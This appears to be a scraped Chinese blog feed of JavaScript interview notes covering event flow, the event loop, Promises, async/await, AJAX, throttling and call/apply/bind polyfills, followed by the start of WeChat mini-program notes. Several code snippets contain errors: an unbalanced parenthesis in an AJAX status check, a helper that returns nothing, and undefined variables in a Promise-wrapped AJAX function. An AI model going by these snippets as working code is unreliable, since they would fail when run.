ele.previousSibling;var el = ele.previousElementSibling; 改12345678ele.replaceChild(el1, el2);ele.innerHTML//如果你的项目将要经过各种形式的安全检查的话，使用 innerHTML 可能导致代码被拒绝。ele.innerTextinnerHTML：内部HTML，content&lt;br/&gt;；outerHTML：外部HTML，&lt;div&gt;content&lt;br/&gt;&lt;/div&gt;；innerText：内部文本，content ；outerText：内部文本，content ； 事件流、事件模型JSDOM标准事件流的触发的先后顺序为：先捕获再冒泡，点击DOM节点时，事件传播顺序：事件捕获阶段，从上往下传播，然后到达事件目标节点，最后是冒泡阶段，从下往上传播 DOM节点添加事件监听方法addEventListener，中参数capture可以指定该监听是添加在事件捕获阶段还是事件冒泡阶段，为false是事件冒泡，为true是事件捕获，并非所有的事件都支持冒泡，比如focus，blur等等，我们可以通过event.bubbles来判断 事件模型有三个常用方法： event.stopPropagation:阻止捕获和冒泡阶段中，当前事件的进一步传播， event.stopImmediatePropagetion，阻止调用相同事件的其他侦听器， event.preventDefault，取消该事件（假如事件是可取消的）而不停止事件的进一步传播， event.target：指向触发事件的元素，在事件冒泡过程中这个值不变 event.currentTarget = this，时间帮顶的当前元素，只有被点击时目标元素的target才会等于currentTarget， 最后，对于执行顺序的问题，如果DOM节点同时绑定了两个事件监听函数，一个用于捕获，一个用于冒泡，那么两个事件的执行顺序真的是先捕获在冒泡吗，答案是否定的，绑定在被点击元素的事件是按照代码添加顺序执行的，其他函数是先捕获再冒泡 事件代理/事件委托不在事件的发生地（直接dom）上设置监听函数，而是在其父元素上设置监听函数，通过事件冒泡，父元素可以监听到子元素上事件的触发，通过判断事件发生元素DOM的类型，来做出不同的响应。 BOM事件循环EventLoop详细步骤如下： 1、所有同步任务都在主线程上执行，形成一个执行栈 2、主线程之外，还存在一个”消息队列”。只要异步操作执行完成，就到消息队列中排队 3、一旦执行栈中的所有同步任务执行完毕，系统就会按次序读取消息队列中的异步任务，于是被读取的异步任务结束等待状态，进入执行栈，开始执行 4、主线程不断重复上面的第三步 宏微任务事件循环中的异步队列有两种：macro（宏任务）队列和 micro（微任务）队列。宏任务队列可以有多个，微任务队列只有一个。 常见的 macro-task 比如：setTimeout、setInterval、 setImmediate、script（整体代码）、 I/O 操作、UI 渲染等。 常见的 micro-task 比如: process.nextTick、new Promise().then(回调)、MutationObserver(html5 新特性) 等。 宏任务每次执行栈执行的代码就是一个宏任务队列，第一个宏任务队列只有一个任务：执行主线程的js代码 浏览器为了能够使得JS内部Macrotask与DOM任务能够有序的执行，会在一个Macrotask执行结束后，在下一个Macrotask 执行开始前，对页面进行重新渲染，流程如下： 1Macrotask -&gt;渲染-&gt; Macrotask -&gt;... Macrotask主要包含： - script(整体代码) - setTimeout - setInterval - I/O - UI交互事件 - postMessage - MessageChannel - setImmediate(Node.js 环境) 微任务可以理解是在当前 task 执行结束后立即执行的任务。在当前Macrotask后，渲染与下一个Macrotask之前执行。 只有一个微任务队列，上一个宏任务队列执行完毕后如果有微任务队列就执行其中所有微任务，再执行下一个宏任务队列 异步generator promise所谓Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。 从语法上说，Promise 是一个对象，从它可以获取异步操作的消息。Promise 提供统一的 API，各种异步操作都可以用同样的方法进行处理。 Promise构造函数接受一个函数作为参数，该函数的两个参数分别是resolve和reject。它们是两个函数，由 JavaScript 引擎提供，不用自己部署。 Promise的三种状态 Promise的执行顺序当我们在构造 Promise 的时候，构造函数内部的代码是立即执行的 Promise对象有以下两个特点。 （1）对象的状态不受外界影响。Promise对象代表一个异步操作，有三种状态：pending（进行中）、fulfilled（已成功）和rejected（已失败）。只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。这也是Promise这个名字的由来，它的英语意思就是“承诺”，表示其他手段无法改变。 （2）一旦状态改变，就不会再变，任何时候都可以得到这个结果。Promise对象的状态改变，只有两种可能：从pending变为fulfilled和从pending变为rejected。只要这两种情况发生，状态就凝固了，不会再变了，会一直保持这个结果，这时就称为 resolved（已定型）。如果改变已经发生了，你再对Promise对象添加回调函数，也会立即得到这个结果。这与事件（Event）完全不同，事件的特点是，如果你错过了它，再去监听，是得不到结果的。 promise一旦新建，就会立即执行，无法取消 1234567891011121314function loadImageAsync(url) &#123; return new Promise(function(resolve, reject) &#123; const image = new Image(); image.onload = function() &#123; resolve(image); &#125;; image.onerror = function() &#123; reject(new Error(&apos;Could not load image at &apos; + url)); &#125;; image.src = url; &#125;);&#125; // new Promise 使用Promise包装了一个图片加载的异步操作。如果加载成功，就调用resolve方法，否则就调用reject方法。// resolve函数的作用是，将Promise对象的状态从“未完成”变为“成功”（即从 pending 变为 resolved），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去；reject函数的作用是，将Promise对象的状态从“未完成”变为“失败”（即从 pending 变为 rejected），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。 Promise实例生成以后，可以用then方法分别指定resolved状态和rejected状态的回调函数。 then12345promise.then(function(value) &#123; // success value from resolve(value)&#125;, function(error) &#123;// failure error from reject(error)&#125;); then方法可以接受两个回调函数作为参数。第一个回调函数是Promise对象的状态变为resolved时调用，第二个回调函数是Promise对象的状态变为rejected时调用。其中，第二个函数是可选的，不一定要提供。这两个函数都接受Promise对象传出的值作为参数。 then方法返回的是一个新的Promise实例（注意，不是原来那个Promise实例）。因此可以采用链式写法，即then方法后面再调用另一个then方法。 12345getJSON(&quot;/posts.json&quot;).then(function(json) &#123; return json.post;&#125;).then(function(post) &#123; // ...&#125;); catchPromise.prototype.catch方法是.then(null, rejection)或.then(undefined, rejection)的别名，用于指定发生错误时的回调函数。 1Promise.prototype.catch=(fn(err)) =&gt;&#123; return Promise.prototype.then(null, fn(err));&#125; finally用于指定不管 Promise 对象最后状态如何，都会执行的操作。该方法是 ES2018 引入标准的。 finally方法的回调函数不接受任何参数，这意味着没有办法知道，前面的 Promise 状态到底是fulfilled还是rejected。这表明，finally方法里面的操作，应该是与状态无关的，不依赖于 Promise 的执行结果。 123456789//实现Promise.prototype.finally = function (callback) &#123; let P = this.constructor; return this.then( value =&gt; P.resolve(callback()).then(() =&gt; value), reason =&gt; P.resolve(callback()).then(() =&gt; &#123; throw reason &#125;) );&#125;; all用于将多个 Promise 实例，包装成一个新的 Promise 实例 Promise.all(iterable) 返回一个新的 Promise 实例。此实例在 iterable 参数内所有的 promise 都 fulfilled 或者参数中不包含 promise 时，状态变成 fulfilled；如果参数中 promise 有一个失败rejected，此实例回调失败，失败原因的是第一个失败 promise 的返回结果。 1const p = Promise.all([p1, p2, p3]); 上面代码中，Promise.all方法接受一个数组作为参数，p1、p2、p3都是 Promise 实例，如果不是，就会先调用下面讲到的Promise.resolve方法，将参数转为 Promise 实例，再进一步处理。（Promise.all方法的参数可以不是数组，但必须具有 Iterator 接口，且返回的每个成员都是 Promise 实例。） p的状态由p1、p2、p3决定，分成两种情况。 （1）只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。 （2）只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。 Promise.all 的特点 Promise.all 的返回值是一个 promise 实例 如果传入的参数为空的可迭代对象，Promise.all 会 同步 返回一个已完成状态的 promise 如果传入的参数中不包含任何 promise,Promise.all 会 异步 返回一个已完成状态的 promise 其它情况下，Promise.all 返回一个 处理中（pending） 状态的 promise. Promise.all 返回的 promise 的状态 如果传入的参数中的 promise 都变成完成状态，Promise.all 返回的 promise 异步地变为完成。 如果传入的参数中，有一个 promise 失败，Promise.all 异步地将失败的那个结果给失败状态的回调函数，而不管其它 promise 是否完成 在任何情况下，Promise.all 返回的 promise 的完成状态的结果都是一个数组 Promise.all 实现 1Promise.all = function (promises) &#123; //promises 是可迭代对象，省略参数合法性检查 return new Promise((resolve, reject) =&gt; &#123; //Array.from 将可迭代对象转换成数组 promises = Array.from(promises); if (promises.length === 0) &#123; resolve([]); &#125; else &#123; let result = []; let index = 0; for (let i = 0; i &lt; promises.length; i++ ) &#123; //考虑到 i 可能是 thenable 对象也可能是普通值 Promise.resolve(promises[i]).then(data =&gt; &#123; result[i] = data; if (++index === promises.length) &#123; //所有的 promises 状态都是 fulfilled，promise.all返回的实例才变成 fulfilled 态 resolve(result); &#125; &#125;, err =&gt; &#123; reject(err); return; &#125;); &#125; &#125; &#125;);&#125; racePromise.race方法同样是将多个 Promise 实例，包装成一个新的 Promise 实例。 1const p = Promise.race([p1, p2, p3]); 上面代码中，只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给p的回调函数。 1const p = Promise.race([ fetch(&apos;/resource-that-may-take-a-while&apos;), new Promise(function (resolve, reject) &#123; setTimeout(() =&gt; reject(new Error(&apos;request timeout&apos;)), 5000) &#125;)]);p.then(console.log).catch(console.error); 上面代码中，如果 5 秒之内fetch方法无法返回结果，变量p的状态就会变为rejected，从而触发catch方法指定的回调函数。 async/awaitasync函数返回一个 Promise 对象，可以使用then方法添加回调函数。当函数执行的时候，一旦遇到await就会先返回，等到异步操作完成，再接着执行函数体内后面的语句。 正常情况下，await命令后是一个Promise对象。如果不是，会被转成一个立即resolve的Promise对象。 await只能用在async函数中，不能用在普通函数中 await后面可能存在reject，需要进行try…catch代码块中 优点： 处理 then 的调用链，能够更清晰准确的写出代码； 能优雅地解决回调地狱问题； 适用性更广泛，async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值； 语义性更强，使得异步代码读起来像同步代码，async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。 缺点： 多个没有依赖性的异步代码使用 await时， 会导致性能上的降低。 使用 async 声明异步函数。这个函数返回一个 AsyncFunction 对象。AsyncFunction 对象表示该函数中包含的代码的异步函数。 调用使用 async 声明函数时，它返回一个 Promise。当这个函数返回一个值时，这个值只是一个普通值而已，这个函数内部将自动创建一个承诺，并使用函数返回的值进行解析。当这个函数抛出异常时，Promise 将被抛出的值拒绝。 使用 async 声明函数时可以包含一个 await 符号，await 暂停这个函数的执行并等待传递的 Promise 的解析完成，然后恢复这个函数的执行并返回解析后的值。 async/wait 的目的是简化使用Promise的行为 让看看下面的例子: 1234567function getNumber1() &#123; return Promise.resolve(&apos;374&apos;);&#125;// 这个函数与getNumber1相同async function getNumber2() &#123; return 374;&#125; 类似地，抛出异常的函数等价于返回被拒绝的 Promise 的函数: 123456function f1() &#123; return Promise.reject(&apos;Some error&apos;);&#125;async function f2() &#123; throw &apos;Some error&apos;;&#125; await 关键字只能在异步函数中使用，并允许同步等待 Promise。如果在 async 函数之外使用 Promise，仍然需要使用 then 回调: 1234567891011121314151617181920212223242526function loadData() &#123; return getJSON() .then(function(response) &#123; if (response.needsAnotherRequest) &#123; return makeAnotherRequest(response) .then(function(anotherResponse) &#123; console.log(anotherResponse) return anotherResponse &#125;) &#125; else &#123; console.log(response) return response &#125; &#125;)&#125;async function loadData() &#123; var response = await getJSON(); if (response.needsAnotherRequest) &#123; var anotherResponse = await makeAnotherRequest(response); console.log(anotherResponse) return anotherResponse &#125; else &#123; console.log(response); return response; &#125;&#125; AJAX什么是AJAX? AJAX即一种异步请求，可以实现页面局部刷新； AJAX实现的步骤： 创建请求对象 与服务端创建连接，执行open方法； 发送请求，执行send方法； 为请求对象绑定onreadystate事件，当readyState为4 且 status为200时处理数据； 原生 Ajax 1234567891011121314151617181920212223242526272829var xhr = new XMLHttpRequest();xhr.open(&apos;post&apos;,&apos;www.xxx.com&apos;,true)//true 开启异步 // 接收返回值xhr.onreadystatechange = function()&#123; if(xhr.readyState === 4 )&#123; if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304)&#123; console.log(xhr.responseText); &#125; &#125;&#125;// 处理请求参数postData = &#123;&quot;name1&quot;:&quot;value1&quot;,&quot;name2&quot;:&quot;value2&quot;&#125;;postData = (function(value)&#123; var dataString = &quot;&quot;; for(var key in value)&#123; dataString += key+&quot;=&quot;+value[key]+&quot;&amp;&quot;; &#125;; return dataString;&#125;(postData));// 设置HTTP请求头，此方法必须在open()方法和send()之间调用xhr.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);// 异常处理xhr.onerror = function() &#123; console.log(&apos;Network request failed&apos;)&#125;// 默认会携带同源请求的cookie，而跨域请求则不会携带cookie，设置xhr的withCredentials的属性为true将允许携带跨域cookie。xhr.withCredentials = true;// 发出请求xhr.send(postData);//send后HTTP请求才会被真正发出 AJAX封装 1function Ajax(options) &#123; var xhr = null; var params = formsParams(options.data); // 第一步： 创建请求对象 if(window.XMLHttpRequest) &#123; xhr = new XMLHttpRequest(); &#125; else &#123; // 兼容IE6 xhr = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); &#125; // 第二步： 连接，执行open和send方法； if(options.type == &apos;GET&apos;) &#123; xhr.open(options.type, options.url + &apos;?&apos; + params, options.async); xhr.send(); &#125; else if(options.type == &apos;POST&apos;) &#123; xhr.open(options.type, options.url, options.async); xhr.setRequestHeader(&apos;Content-Type&apos;, &apos;application/x-www-form-urlencoded&apos;); xhr.send(params); &#125; // 绑定onreadystatechange事件 xhr.onreadystatechange = function() &#123; if(xhr.readyState == 4 &amp;&amp; xhr.status == 200) &#123; options.success(xhr.responseText); &#125; &#125; function formsParams(data) &#123; var arr = []; for(var i in data) &#123; arr.push(i + &apos;=&apos; + data[i]); &#125; arr.join(&apos;&amp;&apos;); &#125;&#125; 使用方法： 1Ajax(&#123; type: &apos;GET&apos;, url: &apos;a.php&apos;, async: true, data: &#123; name: &apos;zhangsan&apos;, age: 10 &#125;, success: function(data) &#123; console.log(data); &#125;&#125;); AJAX的优缺点： 优点： 实现局部刷新 减轻服务器端压力 缺点： 破坏浏览器前进和后退机制； 一个页面ajax请求过多，会造成页面加载缓慢； 数据安全问题不太好，可以采用数据加密的方式； readyState状态码： 0 - open方法还没调用 1 - 已经调用send方法，正在发送请求 2 - send方法已经完成，已经接收到全部相应内容 3- 正在解析相应内容 4 - 相应内容解析完成 staus状态码： 200 - 成功 404 - 未找到 5** - 服务器错误 将原生的ajax封装成promise 123456789101112131415var myNewAjax=function(url)&#123; return new Promise(function(resolve,reject)&#123; var xhr = new XMLHttpRequest(); xhr.open(&apos;get&apos;,url); xhr.send(data); xhr.onreadystatechange=function()&#123; if(xhr.status==200&amp;&amp;readyState==4)&#123; var json=JSON.parse(xhr.responseText); resolve(json) &#125;else if(xhr.readyState==4&amp;&amp;xhr.status!=200)&#123; reject(&apos;error&apos;); &#125; &#125; &#125;)&#125; 方法节流/防抖1function throttle(fn,delay)&#123; let lastTime = 0; //通过闭包保存lastTime return ()=&gt;&#123; let nowTime = Date.now(); if(nowTime - lastTime&gt;delay)&#123; //修正this指向问题 fn.call(this) lastTime = nowTime &#125; &#125;&#125;function debounce(fn,delay)&#123; let timer = null return ()=&gt;&#123; clearTimeout(timer) timer = setTimeout(()=&gt;&#123; fn.apply(this) &#125;,delay) &#125; &#125; 数组去重123456789101112//先排序再对比相邻是否相同，只做了一次排序和一次循环，所以效率比较高function distinct(arr) &#123; arr = arr.sort() let result = [arr[0]] for (let i=1, len=arr.length; i&lt;len; i++) &#123; arr[i] !== arr[i-1] &amp;&amp; result.push(arr[i]) &#125; return result&#125;arr.filter((item,index,self)=&gt;&#123; return index===self.indexOf(item)&#125;) 1使用 ES6 中的 Array.filter() 遍历数组，并结合 indexOf 来排除重复项function distinct(arr) &#123; return arr.filter((item, index)=&gt; &#123; return arr.indexOf(item) === index &#125;)&#125;indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置 1function distinct(arr) &#123; return [...new Set(arr)]&#125; 嵌套的数组扁平化例如: 1flattenDeep([1, [2, [3, [4]], 5]]); //[1, 2, 3, 4, 5] 利用 Array.prototype.flat ES6 为数组实例新增了 flat 方法，用于将嵌套的数组“拉平”，变成一维的数组。该方法返回一个新数组，对原数组没有影响。 flat 默认只会 “拉平” 一层，如果想要 “拉平” 多层的嵌套数组，需要给 flat 传递一个整数，表示想要拉平的层数。 1function flattenDeep(arr, deepLength) &#123; return arr.flat(deepLength);&#125;console.log(flattenDeep([1, [2, [3, [4]], 5]], 3)); 当传递的整数大于数组嵌套的层数时，会将数组拉平为一维数组，JS能表示的最大数字为 Math.pow(2, 53) - 1，因此我们可以这样定义 flattenDeep 函数 1function flattenDeep(arr) &#123; //当然，大多时候我们并不会有这么多层级的嵌套 return arr.flat(Math.pow(2,53) - 1); &#125;console.log(flattenDeep([1, [2, [3, [4]], 5]])); 利用 reduce 和 concat 1function flattenDeep(arr)&#123; return arr.reduce((acc, val) =&gt; Array.isArray(val) ? acc.concat(flattenDeep(val)) : acc.concat(val), []);&#125;console.log(flattenDeep([1, [2, [3, [4]], 5]])); 使用 stack 无限反嵌套多层嵌套数组 1function flattenDeep(input) &#123; const stack = [...input]; const res = []; while (stack.length) &#123; // 使用 pop 从 stack 中取出并移除值 const next = stack.pop(); if (Array.isArray(next)) &#123; // 使用 push 送回内层数组中的元素，不会改动原始输入 original input stack.push(...next); &#125; else &#123; res.push(next); &#125; &#125; // 使用 reverse 恢复原数组的顺序 return res.reverse();&#125;console.log(flattenDeep([1, [2, [3, [4]], 5]])); call/bind/apply1// 对Date的扩展，将 Date 转化为指定格式的String// 月(M)、日(d)、小时(h)、分(m)、秒(s)、季度(q) 可以用 1-2 个占位符， // 年(y)可以用 1-4 个占位符，毫秒(S)只能用 1 个占位符(是 1-3 位的数字) // 例子： // (new Date()).Format(&quot;yyyy-MM-dd hh:mm:ss.S&quot;) ==&gt; 2006-07-02 08:09:04.423 // (new Date()).Format(&quot;yyyy-M-d h:m:s.S&quot;) ==&gt; 2006-7-2 8:9:4.18 Date.prototype.Format = function (fmt) &#123; //author: meizz var o = &#123; &quot;M+&quot;: this.getMonth() + 1, //月份 &quot;d+&quot;: this.getDate(), //日 &quot;h+&quot;: this.getHours(), //小时 &quot;m+&quot;: this.getMinutes(), //分 &quot;s+&quot;: this.getSeconds(), //秒 &quot;q+&quot;: Math.floor((this.getMonth() + 3) / 3), //季度 &quot;S&quot;: this.getMilliseconds() //毫秒 &#125;; if (/(y+)/.test(fmt)) fmt = fmt.replace(RegExp.$1, (this.getFullYear() + &quot;&quot;).substr(4 - RegExp.$1.length)); for (var k in o) if (new RegExp(&quot;(&quot; + k + &quot;)&quot;).test(fmt)) fmt = fmt.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : ((&quot;00&quot; + o[k]).substr((&quot;&quot; + o[k]).length))); return fmt;&#125; call/bind/applycall 和 apply 的功能相同，都是改变 this 的执行，并立即执行函数。区别在于传参方式不同。 func.call(thisArg, arg1, arg2, ...)：第一个参数是 this 指向的对象，其它参数依次传入。 func.apply(thisArg, [argsArray])：第一个参数是 this 指向的对象，第二个参数是数组或类数组。 call 在 call 方法中获取调用call()函数 如果第一个参数没有传入，那么默认指向 window / global(非严格模式) 传入 call 的第一个参数是 this 指向的对象，根据隐式绑定的规则，我们知道 obj.foo(), foo() 中的 this 指向 obj;因此我们可以这样调用函数 thisArgs.func(...args) 返回执行结果 1Function.prototype.call = function() &#123; let [thisArg, ...args] = [...arguments]; if (!thisArg) &#123; //context为null或者是undefined thisArg = typeof window === &apos;undefined&apos; ? global : window; &#125; //this的指向的是当前函数 func (func.call) thisArg.func = this; //执行函数 let result = thisArg.func(...args); delete thisArg.func; //thisArg上并没有 func 属性，因此需要移除 return result;&#125; apply 1Function.prototype.apply = function(thisArg, rest) &#123; let result; //函数返回结果 if (!thisArg) &#123; //context为null或者是undefined thisArg = typeof window === &apos;undefined&apos; ? global : window; &#125; //this的指向的是当前函数 func (func.call) thisArg.func = this; if(!rest) &#123; //第二个参数为 null / undefined result = thisArg.func(); &#125;else &#123; result = thisArg.func(...rest); &#125; delete thisArg.func; //thisArg上并没有 func 属性，因此需要移除 return result;&#125; bind 通过apply或者call方法来实现。 (1)初始版本 1Function.prototype.bind=function(obj,arg)&#123; var arg=Array.prototype.slice.call(arguments,1); var context=this; return function(newArg)&#123; arg=arg.concat(Array.prototype.slice.call(newArg)); return context.apply(obj,arg); &#125;&#125;Function.prototype.bind=function (context) &#123; if(typeof this !==&apos;function&apos;)&#123; throw new Error(`$&#123;this.name&#125; is not a function`) &#125; const srcFun=this// 保存原始函数 const arg=Array.prototype.slice.call(arguments,1)// 把arguments类数组转为真实数组 let noop=function()&#123;&#125; const fBound= function () &#123; if(this instanceof noop)&#123; context=this &#125; // 合并新旧参数 return srcFun.apply(context,arg.concat(Array.prototype.slice.call(arguments,0))) &#125; if(this.prototype)&#123; noop.prototype=this.prototype//维护原型关系，指向原始函数 &#125; fBound.prototype=new noop()//新函数的prototype的__proto__指向noop.prototype return fBound&#125; (2) 官方实现 通过设置一个中转构造函数F，使绑定后的函数与调用bind()的函数处于同一原型链上，用new操作符调用绑定后的函数，返回的对象也能正常使用instanceof，因此这是最严谨的bind()实现。 1if (!Function.prototype.bind) &#123; Function.prototype.bind = function (oThis) &#123; if (typeof this !== &quot;function&quot;) &#123; // closest thing possible to the ECMAScript 5 internal IsCallable function throw new TypeError(&quot;Function.prototype.bind - what is trying to be bound is not callable&quot;); &#125; var aArgs = Array.prototype.slice.call(arguments, 1), fToBind = this, fNOP = function () &#123;&#125;, fBound = function () &#123; return fToBind.apply(this instanceof fNOP &amp;&amp; oThis ? this : oThis || window, aArgs.concat(Array.prototype.slice.call(arguments))); &#125;; fNOP.prototype = this.prototype; fBound.prototype = new fNOP(); return fBound; &#125;; &#125; 实现一个once函数，传入函数参数只执行一次 参考回答： 1`function ones(func)&#123;``var tag=true;``return function()&#123;``if(tag==true)&#123;``func.apply(null,arguments);``tag=false;``&#125;``return undefined``&#125;``&#125;` 简化资源路径栈 1234567891011121314var simplifyPath = function(path) &#123; var result = &apos;&apos; var tempPath = [] var paths = path.split(&apos;/&apos;) paths.map(val =&gt; &#123; if(val &amp;&amp; val === &apos;..&apos;) &#123; tempPath.pop() &#125;else if(val &amp;&amp; val !== &apos;.&apos;) &#123; tempPath.push(val) &#125; &#125;) tempPath.length ? result = &apos;/&apos;+tempPath.join(&apos;/&apos;) : result = &apos;/&apos; return result&#125;; 其他Babel与PolyfillBabel 是一个广泛使用的 ES6 转码器，可以将 ES6 代码转为 ES5 代码。注意：Babel 默认只转换新的 JavaScript 句法（syntax），而不转换新的 API。 12345678910111213//使用babel转码前的代码require(&apos;babel-polyfill&apos;);(x =&gt; x * 2)(1);var b = Array.of(1,2,4);//使用babel转码后的代码&apos;use strict&apos;;require(&apos;babel-polyfill&apos;);(function (x) &#123; return x * 2;&#125;)(1);var b = Array.of(1, 2, 4);//Babel转换了ES6的箭头函数句法，但对于Array.of并没有转换，因为Array.of是ES6的API。 Polyfill用于实现浏览器并不支持的原生API的代码。 但ES6的API对于不支持ES6的浏览器，我们通过引入babel-polyfill使其支持ES6的API http://es6.ruanyifeng.com/#docs/promise https://www.nowcoder.com/questionTerminal/cea0cf46505a412d9f635a06806122f4 https://github.com/forthealllight/blog/issues/4 http://es6.ruanyifeng.com/#docs/promise https://zhuanlan.zhihu.com/p/52731370 https://zhuanlan.zhihu.com/p/57548254 https://www.jianshu.com/p/5cb692658704 https://blog.csdn.net/iot_pro/article/details/78511090 https://www.bilibili.com/video/av59639585/?p=17 https://www.jianshu.com/p/996671d4dcc4]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Fwx%2F</url>
    <content type="text"><![CDATA[前言 微信小程序运行环境小程序的运行环境分成渲染层和逻辑层，其中 WXML 模板和 WXSS 样式工作在渲染层，JS 脚本工作在逻辑层。 小程序的渲染层和逻辑层分别由2个线程管理：渲染层的界面使用了WebView 进行渲染；逻辑层采用JsCore线程运行JS脚本。一个小程序存在多个界面，所以渲染层存在多个WebView线程，这两个线程的通信会经由微信客户端（下文中也会采用Native来代指微信客户端）做中转，逻辑层发送网络请求也经由Native转发，小程序的通信模型下图所示。 通信模型 渲染层程序的逻辑层和渲染层是分开的两个线程。在渲染层，宿主环境会把WXML转化成对应的JS对象，在逻辑层发生数据变更的时候，我们需要通过宿主环境提供的setData方法把数据从逻辑层传递到渲染层，再经过对比前后差异，把差异应用在原来的Dom树上，渲染出正确的UI界面。 事件绑定事件绑定的写法和组件属性一致，以key=”value”的形式，其中： key以bind或者catch开头，然后跟上事件的类型，如bindtap、catchtouchstart。自基础库版本1.5.0起，bind和catch后可以紧跟一个冒号，其含义不变，如bind:tap、catch:touchstart。同时bind和catch前还可以加上capture-来表示捕获阶段。 value是一个字符串，需要在对应的页面Page构造器中定义同名的函数，否则触发事件时在控制台会有报错信息。bind和capture-bind的含义分别代表事件的冒泡阶段和捕获阶段，其触发的顺序如图3-8所示。 以下示例中，点击 inner view 会先后调用handleTap2、handleTap4、handleTap3、handleTap1。 代码清单3-20 事件的冒泡和捕获 1234567891011121314&lt;view id="outer" bind:touchstart="handleTap1" capture-bind:touchstart="handleTap2"&gt; outer view &lt;view id="inner" bind:touchstart="handleTap3" capture-bind:touchstart="handleTap4" &gt; inner view &lt;/view&gt;&lt;/view&gt; bind事件绑定不会阻止冒泡事件向上冒泡，catch事件绑定可以阻止冒泡事件向上冒泡。如果将上面代码中的第一个capture-bind改为capture-catch，将只触发handleTap2(capture-catch将中断捕获阶段和取消冒泡阶段) 代码清单3-21 使用catch阻止事件的传递 1234567891011121314&lt;view id="outer" bind:touchstart="handleTap1" capture-catch:touchstart="handleTap2"&gt; outer view &lt;view id="inner" bind:touchstart="handleTap3" capture-bind:touchstart="handleTap4" &gt; inner view &lt;/view&gt;&lt;/view&gt; 注意，除表3-10列举的事件类型之外的其他组件自定义事件，如无特殊声明都是非冒泡事件，如的submit事件，的input事件，的scroll事件。 逻辑层 小程序中的 JavaScript 是由ECMAScript 以及小程序框架和小程序 API 来实现的。同浏览器中的JavaScript 相比没有 BOM 以及 DOM 对象，所以类似 JQuery、Zepto这种浏览器类库是无法在小程序中运行起来的，同样的缺少 Native 模块和NPM包管理的机制，小程序中无法加载原生库，也无法直接使用大部分的 NPM 包。 小程序中的脚本执行顺序有所不同。小程序的执行的入口文件是 app.js 。并且会根据其中 require 的模块顺序决定文件的运行顺序。 所有页面的脚本逻辑都跑在同一个JsCore线程，页面使用setTimeout或者setInterval的定时器，然后跳转到其他页面时，这些定时器并没有被清除，需要开发者自己在页面离开的时候进行清理。 程序与页面宿主环境提供了 App() 构造器用来注册一个程序App，需要留意的是App() 构造器必须写在项目根目录的app.js里，App实例是单例对象，在其他JS脚本中可以使用宿主环境提供的 getApp() 来获取程序实例。 1234567App(&#123; onLaunch: function(options) &#123;f&#125;, onShow: function(options) &#123;f&#125;, onHide: function() &#123;f&#125;, onError: function(msg) &#123;f&#125;, globalData: 'I am global data'&#125;) 宿主环境提供了 Page() 构造器用来注册一个小程序页面，Page()在页面脚本page.js中调用，Page() 的调用方式如代码清单3-8所示。Page构造器接受一个Object参数，参数说明如表3-4所示，其中data属性是当前页面WXML模板中可以用来做数据绑定的初始数据，我们会在后文展开讨论；onLoad / onReady / onShow / onHide /onUnload 5个回调是Page实例的生命周期函数，我们在后文展开；onPullDownRefresh / onReachBottom / onShareAppMessage / onPageScroll 4个回调是页面的用户行为，我们也会在后文展开。代码清单3-8 Page构造器 123456789101112Page(&#123; data: &#123; text: "This is page data." &#125;, onLoad: function(options) &#123; f&#125;, onReady: function() &#123; f&#125;, onShow: function() &#123;ff &#125;, onHide: function() &#123;f &#125;, onUnload: function() &#123;f &#125;, onPullDownRefresh: function() &#123;f &#125;, onReachBottom: function() &#123; f&#125;, onShareAppMessage: function () &#123;f &#125;, onPageScroll: function() &#123; f&#125;&#125;) 生命周期初次进入小程序的时候，微信客户端初始化好宿主环境，同时从网络下载或者从本地缓存中拿到小程序的代码包，把它注入到宿主环境，初始化完毕后，微信客户端就会给App实例派发onLaunch事件，App构造器参数所定义的onLaunch方法会被调用。进入小程序之后，用户可以点击右上角的关闭，或者按手机设备的Home键离开小程序，此时小程序并没有被直接销毁，我们把这种情况称为“小程序进入后台状态”，App构造器参数所定义的onHide方法会被调用。当再次回到微信或者再次打开小程序时，微信客户端会把“后台”的小程序唤醒，我们把这种情况称为“小程序进入前台状态”，App构造器参数所定义的onShow方法会被调用。我们可以看到，App的生命周期是由微信客户端根据用户操作主动触发的。为了避免程序上的混乱，我们不应该从其他代码里主动调用App实例的生命周期函数。 页面初次加载的时候，微信客户端就会给Page实例派发onLoad事件，Page构造器参数所定义的onLoad方法会被调用，onLoad在页面没被销毁之前只会触发1次，在onLoad的回调中，可以获取当前页面所调用的打开参数option，关于打开参数我们放在这一节的最后再展开阐述。页面显示之后，Page构造器参数所定义的onShow方法会被调用，一般从别的页面返回到当前页面时，当前页的onShow方法都会被调用。在页面初次渲染完成时，Page构造器参数所定义的onReady方法会被调用，onReady在页面没被销毁前只会触发1次，onReady触发时，表示页面已经准备妥当，在逻辑层就可以和视图层进行交互了。以上三个事件触发的时机是onLoad早于 onShow，onShow早于onReady。页面不可见时，Page构造器参数所定义的onHide方法会被调用，这种情况会在使用wx.navigateTo切换到其他页面、底部tab切换时触发。当前页面使用wx.redirectTo或wx.navigateBack返回到其他页时，当前页面会被微信客户端销毁回收，此时Page构造器参数所定义的onUnload方法会被调用。我们可以看到，Page的生命周期是由微信客户端根据用户操作主动触发的。为了避免程序上的混乱，我们不应该在其他代码中主动调用Page实例的生命周期函数。 数据绑定在网页的一般开发流程中，我们通常会通过 JS 操作 DOM (对应 HTML 的描述产生的树)，以引起界面的一些变化响应用户的行为。例如，用户点击某个按钮的时候，JS 会记录一些状态到 JS 变量里边，同时通过 DOMAPI 操控 DOM 